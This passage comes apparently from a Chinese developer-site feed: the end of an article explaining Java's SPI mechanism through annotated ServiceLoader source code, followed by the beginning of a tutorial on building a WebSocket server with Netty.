<p>那么问题来了： 怎么样才能加载这些SPI接口的实现类呢，真正的原因是Java的<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.seven97.top%2Fjava%2Fjvm%2F01-jvmbasic2-classloadingmechanism.html" target="_blank" title="https://www.seven97.top/java/jvm/01-jvmbasic2-classloadingmechanism.html" ref="nofollow noopener noreferrer">类加载机制</a>！ SPI接口属于java rt核心包，只能由启动类加载器BootStrap classLoader加载，而第三方jar包是用户classPath路径下，根据类加载器的可见性原则：启动类加载器无法加载这些jar包，也就是没法向下委托，所以spi必须打破这种传统的双亲委派机制，通过自定义的类加载器来加载第三方jar包下的spi接口实现类！</p>
<p>JDK中ServiceLoader方法的具体实现：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//ServiceLoader实现了Iterable接口，可以遍历所有的服务实现者</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceLoader</span>&lt;S&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterable</span>&lt;S&gt;{

    <span class="hljs-comment">//查找配置文件的目录</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">"META-INF/services/"</span>;

    <span class="hljs-comment">//表示要被加载的服务的类或接口</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;S&gt; service;

    <span class="hljs-comment">//这个ClassLoader用来定位，加载，实例化服务提供者</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ClassLoader loader;

    <span class="hljs-comment">// 访问控制上下文</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AccessControlContext acc;

    <span class="hljs-comment">// 缓存已经被实例化的服务提供者，按照实例化的顺序存储</span>
    <span class="hljs-keyword">private</span> LinkedHashMap&lt;String,S&gt; providers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 迭代器</span>
    <span class="hljs-keyword">private</span> LazyIterator lookupIterator;

    <span class="hljs-comment">//重新加载，就相当于重新创建ServiceLoader了，用于新的服务提供者安装到正在运行的Java虚拟机中的情况。</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reload</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">//清空缓存中所有已实例化的服务提供者</span>
        providers.clear();
        <span class="hljs-comment">//新建一个迭代器，该迭代器会从头查找和实例化服务提供者</span>
        lookupIterator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyIterator</span>(service, loader);
    }

    <span class="hljs-comment">//私有构造器</span>
    <span class="hljs-comment">//使用指定的类加载器和服务创建服务加载器</span>
    <span class="hljs-comment">//如果没有指定类加载器，使用系统类加载器，就是应用类加载器。</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ServiceLoader</span><span class="hljs-params">(Class&lt;S&gt; svc, ClassLoader cl)</span> {
        service = Objects.requireNonNull(svc, <span class="hljs-string">"Service interface cannot be null"</span>);
        loader = (cl == <span class="hljs-literal">null</span>) ? ClassLoader.getSystemClassLoader() : cl;
        acc = (System.getSecurityManager() != <span class="hljs-literal">null</span>) ? AccessController.getContext() : <span class="hljs-literal">null</span>;
        reload();
    }

    <span class="hljs-comment">//解析失败处理的方法</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fail</span><span class="hljs-params">(Class&lt;?&gt; service, String msg, Throwable cause)</span>
        <span class="hljs-keyword">throws</span> ServiceConfigurationError
    {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceConfigurationError</span>(service.getName() + <span class="hljs-string">": "</span> + msg,
                                            cause);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fail</span><span class="hljs-params">(Class&lt;?&gt; service, String msg)</span>
        <span class="hljs-keyword">throws</span> ServiceConfigurationError
    {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceConfigurationError</span>(service.getName() + <span class="hljs-string">": "</span> + msg);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fail</span><span class="hljs-params">(Class&lt;?&gt; service, URL u, <span class="hljs-type">int</span> line, String msg)</span>
        <span class="hljs-keyword">throws</span> ServiceConfigurationError
    {
        fail(service, u + <span class="hljs-string">":"</span> + line + <span class="hljs-string">": "</span> + msg);
    }

    <span class="hljs-comment">//解析服务提供者配置文件中的一行</span>
    <span class="hljs-comment">//首先去掉注释校验，然后保存</span>
    <span class="hljs-comment">//返回下一行行号</span>
    <span class="hljs-comment">//重复的配置项和已经被实例化的配置项不会被保存</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">parseLine</span><span class="hljs-params">(Class&lt;?&gt; service, URL u, BufferedReader r, <span class="hljs-type">int</span> lc, List&lt;String&gt; names)</span>
        	<span class="hljs-keyword">throws</span> IOException, ServiceConfigurationError{
        <span class="hljs-comment">//读取一行</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">ln</span> <span class="hljs-operator">=</span> r.readLine();
        <span class="hljs-keyword">if</span> (ln == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
        }
        <span class="hljs-comment">//#号代表注释行</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">ci</span> <span class="hljs-operator">=</span> ln.indexOf(<span class="hljs-string">'#'</span>);
        <span class="hljs-keyword">if</span> (ci &gt;= <span class="hljs-number">0</span>) ln = ln.substring(<span class="hljs-number">0</span>, ci);
        ln = ln.trim();
        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> ln.length();
        <span class="hljs-keyword">if</span> (n != <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">if</span> ((ln.indexOf(<span class="hljs-string">' '</span>) &gt;= <span class="hljs-number">0</span>) || (ln.indexOf(<span class="hljs-string">'\t'</span>) &gt;= <span class="hljs-number">0</span>))
                fail(service, u, lc, <span class="hljs-string">"Illegal configuration-file syntax"</span>);
            <span class="hljs-type">int</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ln.codePointAt(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">if</span> (!Character.isJavaIdentifierStart(cp))
                fail(service, u, lc, <span class="hljs-string">"Illegal provider-class name: "</span> + ln);
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Character.charCount(cp); i &lt; n; i += Character.charCount(cp)) {
                cp = ln.codePointAt(i);
                <span class="hljs-keyword">if</span> (!Character.isJavaIdentifierPart(cp) &amp;&amp; (cp != <span class="hljs-string">'.'</span>))
                    fail(service, u, lc, <span class="hljs-string">"Illegal provider-class name: "</span> + ln);
            }
            <span class="hljs-keyword">if</span> (!providers.containsKey(ln) &amp;&amp; !names.contains(ln))
                names.add(ln);
        }
        <span class="hljs-keyword">return</span> lc + <span class="hljs-number">1</span>;
    }

    <span class="hljs-comment">//解析配置文件，解析指定的url配置文件</span>
    <span class="hljs-comment">//使用parseLine方法进行解析，未被实例化的服务提供者会被保存到缓存中去</span>
    <span class="hljs-keyword">private</span> Iterator&lt;String&gt; <span class="hljs-title function_">parse</span><span class="hljs-params">(Class&lt;?&gt; service, URL u)</span> <span class="hljs-keyword">throws</span> ServiceConfigurationError{
        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        ArrayList&lt;String&gt; names = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">try</span> {
            in = u.openStream();
            r = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in, <span class="hljs-string">"utf-8"</span>));
            <span class="hljs-type">int</span> <span class="hljs-variable">lc</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
            <span class="hljs-keyword">while</span> ((lc = parseLine(service, u, r, lc, names)) &gt;= <span class="hljs-number">0</span>);
        }
        <span class="hljs-keyword">return</span> names.iterator();
    }

    <span class="hljs-comment">//服务提供者查找的迭代器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span>&lt;S&gt;{

        Class&lt;S&gt; service;<span class="hljs-comment">//服务提供者接口</span>
        ClassLoader loader;<span class="hljs-comment">//类加载器</span>
        Enumeration&lt;URL&gt; configs = <span class="hljs-literal">null</span>;<span class="hljs-comment">//保存实现类的url</span>
        Iterator&lt;String&gt; pending = <span class="hljs-literal">null</span>;<span class="hljs-comment">//保存实现类的全名</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">nextName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-comment">//迭代器中下一个实现类的全名</span>

        <span class="hljs-keyword">private</span> <span class="hljs-title function_">LazyIterator</span><span class="hljs-params">(Class&lt;S&gt; service, ClassLoader loader)</span> {
            <span class="hljs-built_in">this</span>.service = service;
            <span class="hljs-built_in">this</span>.loader = loader;
        }

        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNextService</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">if</span> (nextName != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            <span class="hljs-keyword">if</span> (configs == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">String</span> <span class="hljs-variable">fullName</span> <span class="hljs-operator">=</span> PREFIX + service.getName();
                    <span class="hljs-keyword">if</span> (loader == <span class="hljs-literal">null</span>)
                        configs = ClassLoader.getSystemResources(fullName);
                    <span class="hljs-keyword">else</span>
                        configs = loader.getResources(fullName);
                }
            }
            <span class="hljs-keyword">while</span> ((pending == <span class="hljs-literal">null</span>) || !pending.hasNext()) {
                <span class="hljs-keyword">if</span> (!configs.hasMoreElements()) {
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                }
                pending = parse(service, configs.nextElement());
            }
            nextName = pending.next();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }

        <span class="hljs-keyword">private</span> S <span class="hljs-title function_">nextService</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">if</span> (!hasNextService())
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchElementException</span>();
            <span class="hljs-type">String</span> <span class="hljs-variable">cn</span> <span class="hljs-operator">=</span> nextName;
            nextName = <span class="hljs-literal">null</span>;
            Class&lt;?&gt; c = <span class="hljs-literal">null</span>;
            <span class="hljs-keyword">try</span> {
                c = Class.forName(cn, <span class="hljs-literal">false</span>, loader);
            }
            <span class="hljs-keyword">if</span> (!service.isAssignableFrom(c)) {
                fail(service, <span class="hljs-string">"Provider "</span> + cn  + <span class="hljs-string">" not a subtype"</span>);
            }
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">S</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> service.cast(c.newInstance());
                providers.put(cn, p);
                <span class="hljs-keyword">return</span> p;
            }
        }

        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">if</span> (acc == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> hasNextService();
            } <span class="hljs-keyword">else</span> {
                PrivilegedAction&lt;Boolean&gt; action = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Boolean&gt;() {
                    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">run</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> hasNextService(); }
                };
                <span class="hljs-keyword">return</span> AccessController.doPrivileged(action, acc);
            }
        }

        <span class="hljs-keyword">public</span> S <span class="hljs-title function_">next</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">if</span> (acc == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> nextService();
            } <span class="hljs-keyword">else</span> {
                PrivilegedAction&lt;S&gt; action = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;S&gt;() {
                    <span class="hljs-keyword">public</span> S <span class="hljs-title function_">run</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> nextService(); }
                };
                <span class="hljs-keyword">return</span> AccessController.doPrivileged(action, acc);
            }
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
        }

    }

    <span class="hljs-comment">//获取迭代器</span>
    <span class="hljs-comment">//返回遍历服务提供者的迭代器</span>
    <span class="hljs-comment">//以懒加载的方式加载可用的服务提供者</span>
    <span class="hljs-comment">//懒加载的实现是：解析配置文件和实例化服务提供者的工作由迭代器本身完成</span>
    <span class="hljs-keyword">public</span> Iterator&lt;S&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Iterator</span>&lt;S&gt;() {
            <span class="hljs-comment">//按照实例化顺序返回已经缓存的服务提供者实例</span>
            Iterator&lt;Map.Entry&lt;String,S&gt;&gt; knownProviders
                = providers.entrySet().iterator();

            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">if</span> (knownProviders.hasNext())
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                <span class="hljs-keyword">return</span> lookupIterator.hasNext();
            }

            <span class="hljs-keyword">public</span> S <span class="hljs-title function_">next</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">if</span> (knownProviders.hasNext())
                    <span class="hljs-keyword">return</span> knownProviders.next().getValue();
                <span class="hljs-keyword">return</span> lookupIterator.next();
            }

            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
            }

        };
    }

    <span class="hljs-comment">//为指定的服务使用指定的类加载器来创建一个ServiceLoader</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;S&gt; ServiceLoader&lt;S&gt; <span class="hljs-title function_">load</span><span class="hljs-params">(Class&lt;S&gt; service, ClassLoader loader)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceLoader</span>&lt;&gt;(service, loader);
    }

    <span class="hljs-comment">//使用线程上下文的类加载器来创建ServiceLoader</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;S&gt; ServiceLoader&lt;S&gt; <span class="hljs-title function_">load</span><span class="hljs-params">(Class&lt;S&gt; service)</span> {
        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();
        <span class="hljs-keyword">return</span> ServiceLoader.load(service, cl);
    }

    <span class="hljs-comment">//使用扩展类加载器为指定的服务创建ServiceLoader</span>
    <span class="hljs-comment">//只能找到并加载已经安装到当前Java虚拟机中的服务提供者，应用程序类路径中的服务提供者将被忽略</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;S&gt; ServiceLoader&lt;S&gt; <span class="hljs-title function_">loadInstalled</span><span class="hljs-params">(Class&lt;S&gt; service)</span> {
        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();
        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">prev</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">while</span> (cl != <span class="hljs-literal">null</span>) {
            prev = cl;
            cl = cl.getParent();
        }
        <span class="hljs-keyword">return</span> ServiceLoader.load(service, prev);
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"java.util.ServiceLoader["</span> + service.getName() + <span class="hljs-string">"]"</span>;
    }

}
</code></pre>
<ol>
<li><strong>首先</strong>，ServiceLoader实现了Iterable接口，所以它有迭代器的属性，这里主要都是实现了迭代器的 hasNext 和 next 方法。这里主要都是调用的lookupIterator的相应hasNext和next方法，lookupIterator是懒加载迭代器。</li>
<li><strong>其次</strong>，LazyIterator 中的 hasNext 方法，静态变量PREFIX就是”META-INF/services/”目录，这也就是为什么需要在classpath下的META-INF/services/目录里创建一个以服务接口命名的文件。</li>
<li><strong>最后</strong>，通过反射方法Class.forName()加载类对象，并用newInstance方法将类实例化，并把实例化后的类缓存到providers对象中，(LinkedHashMap&lt;String,S&gt;类型）然后返回实例对象。</li>
</ol>
<p>所以可以看到ServiceLoader不是实例化以后，就去读取配置文件中的具体实现，并进行实例化。而是等到使用迭代器去遍历的时候，才会加载对应的配置文件去解析，调用hasNext方法的时候会去加载配置文件进行解析，调用next方法的时候进行实例化并缓存。</p>
<p>所有的配置文件只会加载一次，服务提供者也只会被实例化一次，重新加载配置文件可使用reload方法。</p>
<h2 data-id="heading-12">JDK SPI机制的缺陷</h2>
<p>通过上面的解析，可以发现，我们使用SPI机制的缺陷：</p>
<ul>
<li>
<p>获取某个实现类的方式不够灵活，只能通过 Iterator 形式获取，不能根据某个参数来获取对应的实现类。如果不想用某些实现类，或者某些类实例化很耗时，它也被载入并实例化了，这就造成了浪费。</p>
</li>
<li>
<p>多个并发多线程使用 ServiceLoader 类的实例是不安全的</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于Netty的WebSocket服务端]]></title>    <link>https://juejin.cn/post/7594337566722146314</link>    <guid>https://juejin.cn/post/7594337566722146314</guid>    <pubDate>2026-01-13T01:10:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594337566722146314" data-draft-id="7594383365417680942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于Netty的WebSocket服务端"/> <meta itemprop="keywords" content="后端,Java,程序员"/> <meta itemprop="datePublished" content="2026-01-13T01:10:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SimonKing"/> <meta itemprop="url" content="https://juejin.cn/user/4001878056904584"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于Netty的WebSocket服务端
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4001878056904584/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SimonKing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:10:05.000Z" title="Tue Jan 13 2026 01:10:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>关注我的公众号：【编程朝花夕拾】，可获取首发内容。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/273e78394c7642f7b75ef444c3b5d64f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=FMn3orGLbdMEIUSXZyCHMB3BypY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">01 引言</h2>
<p>前面用了两节内容介绍了基于Netty的TCP的Socket的相关内容。这一节开始我们介绍基于Netty的WebSocket的相关内容，我们同样可以按照服务端和客户端的方式分别介绍。本节我们介绍WebSocket的服务端。</p>
<h2 data-id="heading-1">02 示例代码</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketServer</span> {

    <span class="hljs-meta">@Getter</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">ChannelGroup</span> <span class="hljs-variable">channelGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultChannelGroup</span>(GlobalEventExecutor.INSTANCE);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();

        <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">serverBootstrap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
        serverBootstrap.group(bossGroup, workGroup);
        serverBootstrap.channel(NioServerSocketChannel.class);
        serverBootstrap.childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;(){

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel socketChannel)</span> <span class="hljs-keyword">throws</span> Exception {
                <span class="hljs-type">ChannelPipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> socketChannel.pipeline();
                pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerCodec</span>());
                pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpObjectAggregator</span>(<span class="hljs-number">65535</span>));
                pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServerProtocolHandler</span>(<span class="hljs-string">"/testWs"</span>));
                <span class="hljs-comment">// 自定义的handler，处理业务逻辑</span>
                pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebBusinessHandler</span>(channelGroup));
            }
        });

        <span class="hljs-comment">// 配置完成，开始绑定server，通过调用sync同步方法阻塞直到绑定成功</span>
        <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> serverBootstrap.bind(<span class="hljs-number">9090</span>).sync();
        log.info(<span class="hljs-string">"Server started and listen on:{}"</span>,channelFuture.channel().localAddress());
        <span class="hljs-comment">// 对关闭通道进行监听</span>
        channelFuture.channel().closeFuture().sync();
    }
}
</code></pre>
<h3 data-id="heading-2">2.1 引导类</h3>
